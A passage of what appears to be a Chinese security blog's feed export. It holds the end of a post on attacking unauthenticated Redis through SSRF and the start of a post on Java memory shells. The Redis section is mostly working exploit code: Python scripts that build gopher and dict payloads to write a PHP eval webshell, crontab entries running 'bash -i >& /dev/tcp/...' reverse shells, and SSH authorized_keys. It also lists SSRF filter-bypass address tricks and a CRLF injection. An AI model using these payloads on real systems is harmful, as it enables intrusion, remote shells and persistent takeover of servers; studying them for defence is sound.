passwd)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>





<h2 id="6-漏洞组合"><a href="#6-漏洞组合" class="headerlink" title="6.漏洞组合"></a>6.漏洞组合</h2><h3 id="SSRF打本地Redis服务"><a href="#SSRF打本地Redis服务" class="headerlink" title="SSRF打本地Redis服务"></a>SSRF打本地Redis服务</h3><p>前提是Web服务器监听本地的Redis存在未授权访问漏洞，并且Web站点支持Gopher协议。这里就能把范围缩小了，PHP是支持Gopher协议的，而Java不支持。</p>
<p>一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis</p>
<p><strong>常见存在ssrf的例子</strong></p>
<p><strong>curl</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">//创建新的 cURL 资源</span></span><br><span class="line">curl\<span class="title function_ invoke__">_setopt</span>(<span class="variable">$ch</span>, CURLOPT\_URL, <span class="variable">$_GET</span>\[<span class="string">&#x27;url&#x27;</span>\]); <span class="comment">//设置URL 和相应的选项</span></span><br><span class="line"><span class="comment"># curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl\<span class="title function_ invoke__">_setopt</span>(<span class="variable">$ch</span>, CURLOPT\_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment"># curl\_setopt($ch, CURLOPT\_PROTOCOLS, CURLPROTO\_HTTP | CURLPROTO\_HTTPS);</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);   <span class="comment">//抓取 URL 内容并把它传递给浏览器，存储进文件</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);  <span class="comment">//关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>或</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>); </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<p> <strong>file_get_contents</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<p>需要使用的redis指令是（和之前写马的是一样的）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename koishi.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>

<p>在ssrf的情况下，我们需要借助 gopher 协议帮助我们写马</p>
<p>根据 RESP 协议编写的 python 脚本<code>redisSsrf.py</code>，将上述命令转换为 gopher payload。</p>
<h4 id="脚本-gopher"><a href="#脚本-gopher" class="headerlink" title="脚本-gopher"></a>脚本-gopher</h4><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse <span class="keyword">as</span> parse</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;192.168.13.128&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">shell = <span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path = <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd = [<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">       <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">       <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">       <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">       <span class="string">&quot;save&quot;</span></span><br><span class="line">       ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(parse.quote(payload))</span><br></pre></td></tr></table></figure></div>

<p>结合 SSRF 时，需要再次进行 URL 编码，也就是二次 url 编码后的结果传入，这样才能写马</p>
<h4 id="脚本-dict-定时任务"><a href="#脚本-dict-定时任务" class="headerlink" title="脚本-dict-定时任务"></a>脚本-dict-定时任务</h4><p>上面写过一次了，这里我再复制一次吧</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.109/ssrf/base/curl_exec.php?url=&quot;</span>  <span class="comment"># 存在 ssrf 的 url</span></span><br><span class="line">target = <span class="string">&quot;dict://192.168.0.119:6379/&quot;</span>  <span class="comment"># redis 服务器地址</span></span><br><span class="line">cmds = [<span class="string">&#x27;set:mars:\\\\&quot;\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\\n\\\\&quot;&#x27;</span>,  <span class="comment"># shell接收地址与端口号</span></span><br><span class="line">        <span class="string">&quot;config:set:dir:/etc/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;config:set:dbfilename:crontab&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bgsave&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> cmds:</span><br><span class="line">    cmd_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> single_char <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="comment"># 先转为ASCII</span></span><br><span class="line">        cmd_encoder += <span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char)).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    cmd_encoder = binascii.a2b_hex(cmd_encoder)</span><br><span class="line">    cmd_encoder = urllib.parse.quote(cmd_encoder, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = url + target + cmd_encoder</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="comment"># request = urllib.request.Request(payload)</span></span><br><span class="line">    <span class="comment"># response = urllib.request.urlopen(request).read()</span></span><br></pre></td></tr></table></figure></div>



<h4 id="脚本-gopher-定时任务"><a href="#脚本-gopher-定时任务" class="headerlink" title="脚本-gopher-定时任务"></a>脚本-gopher-定时任务</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;192.168.230.138&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">reverse_ip = <span class="string">&quot;192.168.163.132&quot;</span></span><br><span class="line">reverse_port = <span class="string">&quot;2333&quot;</span></span><br><span class="line">cron = <span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span> % (reverse_ip, reverse_port)</span><br><span class="line">filename = <span class="string">&quot;root&quot;</span></span><br><span class="line">path = <span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd = [<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">       <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(cron.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">       <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">       <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">       <span class="string">&quot;save&quot;</span></span><br><span class="line">       ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure></div>





<h4 id="脚本-写ssh私钥"><a href="#脚本-写ssh私钥" class="headerlink" title="脚本-写ssh私钥"></a>脚本-写ssh私钥</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;192.168.230.138&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">sshpublic_key = <span class="string">&quot;\n\nid_rsa.pub 里的内容\n\n&quot;</span></span><br><span class="line">filename = <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">path = <span class="string">&quot;/root/.ssh/&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd = [<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">       <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(sshpublic_key.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">       <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">       <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">       <span class="string">&quot;save&quot;</span></span><br><span class="line">       ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure></div>



<h3 id="SSRF-ip绕过"><a href="#SSRF-ip绕过" class="headerlink" title="SSRF ip绕过"></a>SSRF ip绕过</h3><h4 id="1-xip-io"><a href="#1-xip-io" class="headerlink" title="1. xip.io"></a>1. xip.io</h4><p>xip.io的原理很简单，就是个dns解析服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">        10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">    www.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line"> mysite.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br></pre></td></tr></table></figure></div>

<p>类似这样的格式都解析为 10.0.0.1<br><a class="link"   href="http://域名+地址+xip.io/" >http:&#x2F;&#x2F;域名+地址+xip.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，将解析到对应地址。</p>
<h4 id="2-本地回环地址的其他表现形式"><a href="#2-本地回环地址的其他表现形式" class="headerlink" title="2. 本地回环地址的其他表现形式"></a><strong>2. 本地回环地址的其他表现形式</strong></h4><p><strong>127.0.0.1</strong>，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[])：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1</span><br><span class="line">http://localhost</span><br><span class="line">http://127.255.255.254</span><br><span class="line">127.0.0.1 - 127.255.255.254 之间</span><br><span class="line">http://[::1]</span><br><span class="line">http://[::ffff:7f00:1]</span><br><span class="line">http://[::ffff:127.0.0.1]</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]</span><br><span class="line">http://127.1</span><br><span class="line">http://127.0.1</span><br><span class="line">http://0:80</span><br></pre></td></tr></table></figure></div>



<h4 id="3-对ip进行进制转换"><a href="#3-对ip进行进制转换" class="headerlink" title="3. 对ip进行进制转换"></a>3. 对ip进行进制转换</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240121130241839.png"
                      alt="image-20240121130241839"
                ></p>
<p>（十六进制也可以和十进制一样不用加 点）</p>
<p>由于IP地址可以用多种格式表示，因此可以在URL中如下所示使用：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">点分十进制IP地址（正常形式）			http://127.0.0.1</span><br><span class="line">八进制IP地址					     http://0177.0000.0000.0001（将每个十进制数字转换为八进制）</span><br><span class="line">十六进制IP地址					http://0x7f000001 或者 http://0x7f.0x00.0x00.0x01（将每个十进制数字转换为十六进制）</span><br><span class="line">整数或DWORD IP地址                http://2130706433 (十进制)</span><br><span class="line">不同进制组合也是可以的              http://0177.0.0.0x01</span><br></pre></td></tr></table></figure></div>



<h4 id="4-添加一些url标志混淆"><a href="#4-添加一些url标志混淆" class="headerlink" title="4. 添加一些url标志混淆"></a>4. 添加一些url标志混淆</h4><p><strong>比如使用 “@” 符号绕过</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.10.10 http//10.10.10.10请求是相同的。</span><br></pre></td></tr></table></figure></div>

<p>该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。</p>
<p>其他的还有</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com@127.0.0.1/</span><br><span class="line">http://a@127.0.0.1:80@baidu.com</span><br><span class="line">http://127.0.0.1/www.baidu.com/../../../../../etc/passwd</span><br><span class="line">http://127.0.0.1/?url=www.baidu.com</span><br><span class="line">http://127.0.0.1/#www.baidu.com</span><br></pre></td></tr></table></figure></div>



<h4 id="5-点分割符号替换（钓鱼邮件常用于绕过检测）"><a href="#5-点分割符号替换（钓鱼邮件常用于绕过检测）" class="headerlink" title="5. 点分割符号替换（钓鱼邮件常用于绕过检测）"></a><strong>5. 点分割符号替换（钓鱼邮件常用于绕过检测）</strong></h4><p>在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用。、｡、．来代替：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www。qq。com</span><br><span class="line">http://www｡qq｡com</span><br><span class="line">http://www．qq．com</span><br></pre></td></tr></table></figure></div>



<h4 id="6-特殊数字绕过"><a href="#6-特殊数字绕过" class="headerlink" title="6. 特殊数字绕过"></a>6. 特殊数字绕过</h4><p>有时候可以用特殊数字来绕过，构造特殊的127.0.0.1，如圈或者unicode字符</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">①②⑦.⓪.⓪.①</span><br><span class="line">𝟏𝟐𝟕.𝟎.𝟎.𝟏</span><br><span class="line">𝟭𝟮𝟳.𝟬.𝟬.𝟭</span><br><span class="line">１２７.０.０.１</span><br></pre></td></tr></table></figure></div>

<p>uncode字符</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗</span><br><span class="line">𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵</span><br><span class="line">０１２３４５６７８９</span><br><span class="line">𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻</span><br><span class="line">𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡</span><br></pre></td></tr></table></figure></div>





<h3 id="Python-urllib-CRLF注入打本地Redis服务"><a href="#Python-urllib-CRLF注入打本地Redis服务" class="headerlink" title="Python urllib CRLF注入打本地Redis服务"></a>Python urllib CRLF注入打本地Redis服务</h3><p>该漏洞的前提python版本为python3 &lt; 3.4.3 || python2 &lt; 2.7.9，现在的python已不存在该问题，漏洞太老了。</p>
<p>如果目标站点使用了Python漏洞版本的urllib库，并且请求的url外部可控，那么就可能存在内网被探测的风险，如果本机或内网服务器中装有未授权访问漏洞的Redis，那么服务器就存在被getshell的风险。</p>
<p>原理和组合SSRF漏洞完全一样，可以通过CRLF注入来利用Redis向Crontab写入反弹shell的定时任务。</p>
<p>例子：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a</span><br></pre></td></tr></table></figure></div>

<p>解码结果如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1</span><br><span class="line">set admin 123456</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>

<p>写定时任务同之前的payload</p>
<p>详情参考：<a class="link"   href="https://security.tencent.com/index.php/blog/msg/106" >https://security.tencent.com/index.php/blog/msg/106 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>组件漏洞</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>java 内存马学习</title>
    <url>/2022/03/08/blog_Memshell%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[
  <div class="note p-4 mb-4 rounded-small primary">
    <p>大一的时候不懂事写着玩的，如果有问题欢迎师傅们指出</p>
<p><a class="link"   href="https://github.com/Ko1sh1/StudyMem" >https://github.com/Ko1sh1/StudyMem <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  这里是当时学习的时候写的练习项目</p>

  </div>



<blockquote>
<p>参考:</p>
<ul>
<li><p><a class="link"   href="https://su18.org/post/memory-shell/" >https://su18.org/post/memory-shell/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p><a class="link"   href="https://su18.org/post/memory-shell-2/" >https://su18.org/post/memory-shell-2/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p><a class="link"   href="http://wjlshare.com/archives/1529" >Tomcat 内存马学习(一)：Filter型 – 天下大木头 (wjlshare.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
</blockquote>
<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p><strong>目前安全行业主要讨论的内存马主要分为以下几种方式：</strong></p>
<blockquote>
<ul>
<li>动态注册 servlet&#x2F;filter&#x2F;listener（使用 servlet-api 的具体实现）</li>
<li>动态注册 interceptor&#x2F;controller（使用框架如 spring&#x2F;struts2）</li>
<li>动态注册使用<strong>职责链</strong>设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</li>
<li>使用 java agent 技术写入字节码</li>
</ul>
</blockquote>
<h3 id="Servlet-API-提供的动态注册机制"><a href="#Servlet-API-提供的动态注册机制" class="headerlink" title="Servlet API 提供的动态注册机制"></a>Servlet API 提供的动态注册机制</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1.png"
                      alt="1"
                ></p>
<blockquote>
<p><code>Servlet</code>、<code>Listener</code>、<code>Filter</code> 由 <code>javax.servlet.ServletContext</code> 去加载，无论是使用 xml 配置文件还是使用 Annotation 注解配置，均由 Web 容器进行初始化，读取其中的配置属性，然后向容器中进行注册。</p>
<p><code>Servlet</code> 3.0 <code>API</code> 允许使 <code>ServletContext</code> 用动态进行注册，在 Web 容器初始化的时候（即建立<code>ServletContext</code> 对象的时候）进行动态注册。可以看到 <code>ServletContext</code> 提供了 add*&#x2F;create* 方法来实现动态注册的功能。</p>
</blockquote>
<blockquote>
<ul>
<li>Servlet ：在用户请求路径与处理类映射之处，添加一个指定路径的指定处理类；</li>
<li>Filter：在用户处理类之前的，用来对请求进行额外处理提供额外功能的类；</li>
<li>Listener：在 Filter 之外的监听进程。</li>
</ul>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1623383074795-16654925598902.png"
                      alt="1623383074795"
                ></p>
<h2 id="二、Filter-内存马原理分析"><a href="#二、Filter-内存马原理分析" class="headerlink" title="二、Filter 内存马原理分析"></a>二、Filter 内存马原理分析</h2><p><a class="link"   href="http://wjlshare.com/archives/1529" >Tomcat 内存马学习(一)：Filter型 – 天下大木头 (wjlshare.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（Filter流程写的相对比较清楚，讲的挺细）</p>
<p><a class="link"   href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/" >查杀Java web filter型内存马 | 回忆飘如雪 (gv7.me) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/" >Tomcat-Filter型内存马 - Longlone’s Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="知识点归纳"><a href="#知识点归纳" class="headerlink" title="知识点归纳"></a>知识点归纳</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20210330212301006.png"
                      alt="image-20210330212301006"
                ></p>
<blockquote>
<p>Filter 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。</p>
</blockquote>
<p>通常情况下，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 使用 ServletContext 的 addFilter/createFilter 方法注册；</span><br><span class="line">2. 使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册（将会在 Listener 中进行描述）；</span><br><span class="line">3. 使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态，后面会描述）。</span><br></pre></td></tr></table></figure></div>

<p>本节只讨论使用 <code>ServletContext</code> 添加 Filter 内存马的方法。首先来看一下 <code>createFilter</code> 方法，按照注释，这个类用来在调用 <code>addFilter</code> 向 <code>ServletContext</code> 实例化一个指定的 Filter 类。</p>
<p><img  
